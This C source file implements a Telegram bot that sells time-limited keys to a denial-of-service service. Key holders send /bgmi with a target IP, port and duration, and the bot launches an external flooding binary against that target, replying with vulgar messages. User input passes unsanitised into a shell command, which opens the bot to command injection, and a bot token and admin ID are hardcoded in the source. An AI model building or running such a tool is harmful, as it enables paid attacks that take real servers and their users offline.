#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <curl/curl.h>
#include "cJSON.h"  // Ensure you have cJSON installed and available

// --- Configuration ---
#define BOT_TOKEN "7208692651:AAFkw-n7GpS2EhO8neK1-2__dnp8B6fwiog"
#define ADMIN_ID "1319994892"          // Change to your admin Telegram user id (as string)
#define OWNER_USERNAME "Rishi747"    // Not used directly in this example
#define USER_FILE "users.json"
#define KEY_FILE "keys.json"
#define DEFAULT_THREADS 50

// --- Global Variables for JSON Data ---
cJSON *users = NULL; // mapping: user_id -> expiration string ("YYYY-MM-DD HH:MM:SS")
cJSON *keys = NULL;  // mapping: key -> expiration string

// --- User Process Structure ---
typedef struct user_process {
    char user_id[32];  // Telegram user id as string
    pid_t pid;
    char command[256];
    struct user_process *next;
} user_process_t;

user_process_t *user_processes = NULL;

// --- HTTP Response Buffer Structure ---
struct MemoryStruct {
    char *memory;
    size_t size;
};

// --- Callback for libcurl ---
size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if (mem->memory == NULL) return 0; // Out of memory!
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

// --- Simple HTTP GET using libcurl ---
char* http_get(const char *url) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl = curl_easy_init();
    if(!curl) return NULL;
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }
    curl_easy_cleanup(curl);
    return chunk.memory;
}

// --- Simple HTTP POST using libcurl ---
char* http_post(const char *url, const char *postfields) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl = curl_easy_init();
    if(!curl) return NULL;
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        return NULL;
    }
    curl_easy_cleanup(curl);
    return chunk.memory;
}

// --- Send a Telegram message ---
void send_message(const char *chat_id, const char *text) {
    char url[512];
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
    
    char postfields[1024];
    snprintf(postfields, sizeof(postfields), "chat_id=%s&text=%s", chat_id, text);
    
    char *response = http_post(url, postfields);
    if (response) {
        free(response);
    }
}

// --- JSON File I/O ---
cJSON* load_json_file(const char *filename) {
    FILE *fp = fopen(filename, "r");
    if(!fp) return cJSON_CreateObject();
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *data = malloc(fsize + 1);
    fread(data, 1, fsize, fp);
    fclose(fp);
    data[fsize] = 0;
    cJSON *json = cJSON_Parse(data);
    free(data);
    if(!json) json = cJSON_CreateObject();
    return json;
}

void save_json_file(const char *filename, cJSON *json) {
    char *data = cJSON_Print(json);
    FILE *fp = fopen(filename, "w");
    if(fp) {
        fputs(data, fp);
        fclose(fp);
    }
    free(data);
}

void load_data() {
    users = load_json_file(USER_FILE);
    keys = load_json_file(KEY_FILE);
}

void save_users() {
    save_json_file(USER_FILE, users);
}

void save_keys() {
    save_json_file(KEY_FILE, keys);
}

// --- Utility Functions ---
void generate_key(char *dest, int length) {
    const char *chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    int clen = strlen(chars);
    for (int i = 0; i < length; i++) {
        dest[i] = chars[rand() % clen];
    }
    dest[length] = '\0';
}

void add_time_to_current_date(int hours, int days, char *dest, size_t dest_size) {
    time_t now = time(NULL);
    now += hours * 3600 + days * 86400;
    struct tm *tm_info = localtime(&now);
    strftime(dest, dest_size, "%Y-%m-%d %H:%M:%S", tm_info);
}

// --- Telegram Update Polling ---
long update_offset = 0;

char* get_updates() {
    char url[512];
    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates?offset=%ld&timeout=10", BOT_TOKEN, update_offset);
    return http_get(url);
}

// --- Process a Single Update ---
void process_update(cJSON *update_obj) {
    cJSON *update_id_item = cJSON_GetObjectItem(update_obj, "update_id");
    if(update_id_item) {
        long update_id = update_id_item->valuedouble;
        if(update_id >= update_offset) {
            update_offset = update_id + 1;
        }
    }
    cJSON *message = cJSON_GetObjectItem(update_obj, "message");
    if(!message) return;
    
    cJSON *from = cJSON_GetObjectItem(message, "from");
    if(!from) return;
    cJSON *user_id_item = cJSON_GetObjectItem(from, "id");
    if(!user_id_item) return;
    char user_id[32];
    snprintf(user_id, sizeof(user_id), "%d", user_id_item->valueint);
    
    cJSON *text_item = cJSON_GetObjectItem(message, "text");
    if(!text_item) return;
    const char *text = text_item->valuestring;
    
    // Only process commands (starting with '/')
    if(text[0] != '/') return;
    
    char command[64] = {0};
    char args[256] = {0};
    sscanf(text, "/%s %[^\n]", command, args);
    
    // --- /genkey <amount> <hours/days> ---
    if(strcmp(command, "genkey") == 0) {
        if(strcmp(user_id, ADMIN_ID) == 0) {
            int time_amount;
            char time_unit[16] = {0};
            if(sscanf(args, "%d %15s", &time_amount, time_unit) == 2) {
                char expiration_date[64];
                if(strcmp(time_unit, "hours") == 0)
                    add_time_to_current_date(time_amount, 0, expiration_date, sizeof(expiration_date));
                else if(strcmp(time_unit, "days") == 0)
                    add_time_to_current_date(0, time_amount, expiration_date, sizeof(expiration_date));
                else {
                    send_message(user_id, "Invalid time unit. Use hours or days.");
                    return;
                }
                char key[16];
                generate_key(key, 6);
                cJSON_AddItemToObject(keys, key, cJSON_CreateString(expiration_date));
                save_keys();
                
                char response[256];
                snprintf(response, sizeof(response), "Key generated: %s\nExpires on: %s", key, expiration_date);
                send_message(user_id, response);
            } else {
                send_message(user_id, "Usage: /genkey <amount> <hours/days>");
            }
        } else {
            send_message(user_id, "ONLY OWNER CAN USE.");
        }
    }
    // --- /redeem <key> ---
    else if(strcmp(command, "redeem") == 0) {
        char key[32];
        if(sscanf(args, "%31s", key) == 1) {
            cJSON *exp_item = cJSON_GetObjectItem(keys, key);
            if(exp_item) {
                const char *expiration_date = exp_item->valuestring;
                char new_expiration[64] = {0};
                cJSON *user_exp = cJSON_GetObjectItem(users, user_id);
                time_t now = time(NULL);
                if(user_exp) {
                    struct tm tm_user = {0};
                    strptime(user_exp->valuestring, "%Y-%m-%d %H:%M:%S", &tm_user);
                    time_t user_time = mktime(&tm_user);
                    if(user_time < now) user_time = now;
                    user_time += 3600; // add 1 hour
                    struct tm *tm_new = localtime(&user_time);
                    strftime(new_expiration, sizeof(new_expiration), "%Y-%m-%d %H:%M:%S", tm_new);
                } else {
                    strncpy(new_expiration, expiration_date, sizeof(new_expiration));
                }
                cJSON_ReplaceItemInObject(users, user_id, cJSON_CreateString(new_expiration));
                save_users();
                cJSON_DeleteItemFromObject(keys, key);
                save_keys();
                char response[256];
                snprintf(response, sizeof(response), "✅Key redeemed successfully! Access granted until: %s", new_expiration);
                send_message(user_id, response);
            } else {
                send_message(user_id, "Invalid or expired key.");
            }
        } else {
            send_message(user_id, "Usage: /redeem <key>");
        }
    }
    // --- /allusers ---
    else if(strcmp(command, "allusers") == 0) {
        if(strcmp(user_id, ADMIN_ID) == 0) {
            char response[1024] = "Authorized Users:\n";
            cJSON *iter = users->child;
            while(iter) {
                char line[256];
                snprintf(line, sizeof(line), "- User ID: %s expires on %s\n", iter->string, iter->valuestring);
                strncat(response, line, sizeof(response) - strlen(response) - 1);
                iter = iter->next;
            }
            send_message(user_id, response);
        } else {
            send_message(user_id, "ONLY OWNER CAN USE.");
        }
    }
    // --- /bgmi <target_ip> <port> <duration> ---
    else if(strcmp(command, "bgmi") == 0) {
        cJSON *user_exp = cJSON_GetObjectItem(users, user_id);
        if(!user_exp) {
            send_message(user_id, "Access expired or unauthorized. Please redeem a valid key.");
            return;
        }
        struct tm tm_user = {0};
        strptime(user_exp->valuestring, "%Y-%m-%d %H:%M:%S", &tm_user);
        if(mktime(&tm_user) < time(NULL)) {
            send_message(user_id, "Access expired. Please redeem a valid key.");
            return;
        }
        char target_ip[64], port[16], duration[16];
        if(sscanf(args, "%63s %15s %15s", target_ip, port, duration) == 3) {
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "./vof %s %s %s %d", target_ip, port, duration, DEFAULT_THREADS);
            pid_t pid = fork();
            if(pid == 0) {
                execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
                exit(1);
            } else if(pid > 0) {
                user_process_t *up = malloc(sizeof(user_process_t));
                strncpy(up->user_id, user_id, sizeof(up->user_id));
                up->pid = pid;
                strncpy(up->command, cmd, sizeof(up->command));
                up->next = user_processes;
                user_processes = up;
                char response[256];
                snprintf(response, sizeof(response), "Chudai set at: %s:%s for %s seconds....Press /start to fuck servers.", target_ip, port, duration);
                send_message(user_id, response);
            } else {
                send_message(user_id, "Failed to start process.");
            }
        } else {
            send_message(user_id, "Usage: /bgmi <target_ip> <port> <duration>");
        }
    }
    // --- /start ---
    else if(strcmp(command, "start") == 0) {
        user_process_t *up = user_processes;
        int found = 0;
        while(up) {
            if(strcmp(up->user_id, user_id) == 0) {
                if(waitpid(up->pid, NULL, WNOHANG) == 0) {
                    send_message(user_id, "Flooding is already running.");
                } else {
                    pid_t pid = fork();
                    if(pid == 0) {
                        execl("/bin/sh", "sh", "-c", up->command, (char *)NULL);
                        exit(1);
                    } else if(pid > 0) {
                        up->pid = pid;
                        send_message(user_id, "Chudai Started...Press /stop to stop fucking.");
                    } else {
                        send_message(user_id, "Failed to start process.");
                    }
                }
                found = 1;
                break;
            }
            up = up->next;
        }
        if(!found)
            send_message(user_id, "No flooding parameters set. Use /bgmi to set parameters.");
    }
    // --- /stop ---
    else if(strcmp(command, "stop") == 0) {
        user_process_t **pp = &user_processes;
        int found = 0;
        while(*pp) {
            if(strcmp((*pp)->user_id, user_id) == 0) {
                kill((*pp)->pid, SIGTERM);
                user_process_t *temp = *pp;
                *pp = (*pp)->next;
                free(temp);
                send_message(user_id, "Stopped flooding and cleared saved parameters.");
                found = 1;
                break;
            }
            pp = &((*pp)->next);
        }
        if(!found)
            send_message(user_id, "No flooding process is running.");
    }
    // --- /broadcast <message> ---
    else if(strcmp(command, "broadcast") == 0) {
        if(strcmp(user_id, ADMIN_ID) == 0) {
            if(strlen(args) == 0) {
                send_message(user_id, "Usage: /broadcast <message>");
                return;
            }
            cJSON *iter = users->child;
            while(iter) {
                send_message(iter->string, args);
                iter = iter->next;
            }
            send_message(user_id, "Message sent to all users.");
        } else {
            send_message(user_id, "ONLY OWNER CAN USE.");
        }
    }
    // --- /help ---
    else if(strcmp(command, "help") == 0) {
        send_message(user_id, "Commands:\n/redeem <key>\n/stop\n/start\n/genkey <amount> <hours/days>\n/bgmi <target_ip> <port> <duration>\n/broadcast <message>");
    }
    else {
        send_message(user_id, "Unknown command.");
    }
}

// --- Main Loop ---
int main(void) {
    srand(time(NULL));
    curl_global_init(CURL_GLOBAL_DEFAULT);
    load_data();
    
    while (1) {
        char *updates = get_updates();
        if (updates) {
            cJSON *json = cJSON_Parse(updates);
            free(updates);
            if (json) {
                cJSON *result = cJSON_GetObjectItem(json, "result");
                if (result && cJSON_IsArray(result)) {
                    int arraySize = cJSON_GetArraySize(result);
                    for (int i = 0; i < arraySize; i++) {
                        cJSON *update_obj = cJSON_GetArrayItem(result, i);
                        process_update(update_obj);
                    }
                }
                cJSON_Delete(json);
            }
        }
        sleep(1);
    }
    
    curl_global_cleanup();
    return 0;
}

// Compile: gcc -o rishi rishi.c -lcurl -lcjson
